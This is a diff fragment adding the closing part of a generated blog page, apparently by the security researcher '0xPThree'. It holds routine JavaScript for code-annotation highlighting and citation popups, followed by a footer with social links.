+          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+          elementsIds.forEach((elId) => {
+            const div = window.document.getElementById(elId);
+            if (div) {
+              div.remove();
+            }
+          });
+          selectedAnnoteEl = undefined;
+        };
+          // Handle positioning of the toggle
+      window.addEventListener(
+        "resize",
+        throttle(() => {
+          elRect = undefined;
+          if (selectedAnnoteEl) {
+            selectCodeLines(selectedAnnoteEl);
+          }
+        }, 10)
+      );
+      function throttle(fn, ms) {
+      let throttle = false;
+      let timer;
+        return (...args) => {
+          if(!throttle) { // first call gets through
+              fn.apply(this, args);
+              throttle = true;
+          } else { // all the others get throttled
+              if(timer) clearTimeout(timer); // cancel #2
+              timer = setTimeout(() => {
+                fn.apply(this, args);
+                timer = throttle = false;
+              }, ms);
+          }
+        };
+      }
+        // Attach click handler to the DT
+        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+        for (const annoteDlNode of annoteDls) {
+          annoteDlNode.addEventListener('click', (event) => {
+            const clickedEl = event.target;
+            if (clickedEl !== selectedAnnoteEl) {
+              unselectCodeLines();
+              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+              if (activeEl) {
+                activeEl.classList.remove('code-annotation-active');
+              }
+              selectCodeLines(clickedEl);
+              clickedEl.classList.add('code-annotation-active');
+            } else {
+              // Unselect the line
+              unselectCodeLines();
+              clickedEl.classList.remove('code-annotation-active');
+            }
+          });
+        }
+    const findCites = (el) => {
+      const parentEl = el.parentElement;
+      if (parentEl) {
+        const cites = parentEl.dataset.cites;
+        if (cites) {
+          return {
+            el,
+            cites: cites.split(' ')
+          };
+        } else {
+          return findCites(el.parentElement)
+        }
+      } else {
+        return undefined;
+      }
+    };
+    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+    for (var i=0; i<bibliorefs.length; i++) {
+      const ref = bibliorefs[i];
+      const citeInfo = findCites(ref);
+      if (citeInfo) {
+        tippyHover(citeInfo.el, function() {
+          var popup = window.document.createElement('div');
+          citeInfo.cites.forEach(function(cite) {
+            var citeDiv = window.document.createElement('div');
+            citeDiv.classList.add('hanging-indent');
+            citeDiv.classList.add('csl-entry');
+            var biblioDiv = window.document.getElementById('ref-' + cite);
+            if (biblioDiv) {
+              citeDiv.innerHTML = biblioDiv.innerHTML;
+            }
+            popup.appendChild(citeDiv);
+          });
+          return popup.innerHTML;
+        });
+      }
+    }
+  });
+  </script>
+</div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+      &nbsp;
+    </div>   
+    <div class="nav-footer-center">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item">
+ © 2025 0xPThree - All Rights Reserved.
+  </li>  
+</ul>
+    </div>
+    <div class="nav-footer-right">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
+      <i class="bi bi-signal" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://github.com/0xpthree">
+      <i class="bi bi-github" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="../../index.xml">
+      <i class="bi bi-rss" role="img">
+</i> 
+    </a>
+  </li>  
+</ul>
+    </div>
+  </div>
+</footer>
+
+
+
+
+</body></html>
